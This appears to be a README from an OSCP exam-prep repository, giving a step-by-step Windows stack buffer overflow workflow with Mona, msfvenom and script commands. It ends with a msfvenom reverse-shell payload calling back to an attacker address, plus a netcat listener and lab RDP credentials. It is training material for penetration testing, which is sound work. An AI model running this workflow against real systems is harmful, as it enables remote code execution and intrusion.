# OSCP_Prep: Buffer Overflow

For OSCP Buffer Overflow preparation, you don't need complicated codes and/or advanced python skills. You just need a simple python code and work your way up. The following steps are to help you in each of the step that you take. These 6 simple steps are just what you need for OCSP Buffer Overflow preparation.

```c++
> xfreerdp /u:admin /p:password /cert:ignore /v:192.168.10.10
```

### 01 Fuzzing

```c++
> ./01-fuzz.py
```

Press `Ctrl + C` after the application crushed. Note down the byte number. (Example: Crushed at 2000)

### 02 Finding Offset

```c++
> msf-pattern_create -l 2000

> ./02-offset.py
```

At this point, I'm assuming you have Mona setup. 

```c++
> !mona findmsp -distance 2000
```

Find EIP normal pattern. (Example: EIP contains normal pattern : 0x42987857 (offset 1876))

### 03 Controlling EIP

```c++
> ./03-eip.py
```

You should see `424242` for EIP.

### 04 Finding Bad Characters

Setting up mona working directory:

```c++
> !mona config -set workingfolder c:\mona\%p
```

Generating byte array:

```c++
> !mona bytearray -b "\x00"
```

Running the script:

```c++
> ./04-badchar.py

> !mona compare -f C:\mona\oscp\bytearray.bin -a 0321FF88
```

Generating byte array with bad characters removed. Update the script and run again util you see 'Unmodified' status in mona memory comparison result.

```c++
> !mona bytearray -b "\x00\x0d"

> ./04-badchar.py

> !mona compare -f C:\mona\oscp\bytearray.bin -a 03B2FF88
```

### 05 Finding a Jump Point

```c++
> !mona jmp -r esp -cpb "\x00\x0d"
```

Set the break point by entering the pointer address and pressing `F2`.

```c++
> ./05-pointer.py
```

If the pointer address stop at EIP. You are good to go.

### 06 Popping Calculator

*Make sure to edit bad character

```c++
> msfvenom -p windows/exec CMD="C:\windows\system32\calc.exe" -b '\x00\x0d' -f c

> ./06-calc.py
```

After successfully popping the calculator app, next step is to get a shell.

*Again, make sure the get the bad character right. 

```c++
> msfvenom -p windows/shell_reverse_tcp LHOST=192.168.10.11 LPORT=443 EXITFUNC=thread -f c -a x86 -b "\x00\x0d"

> nc -lvnp 443

> ./07-exploit.py
```
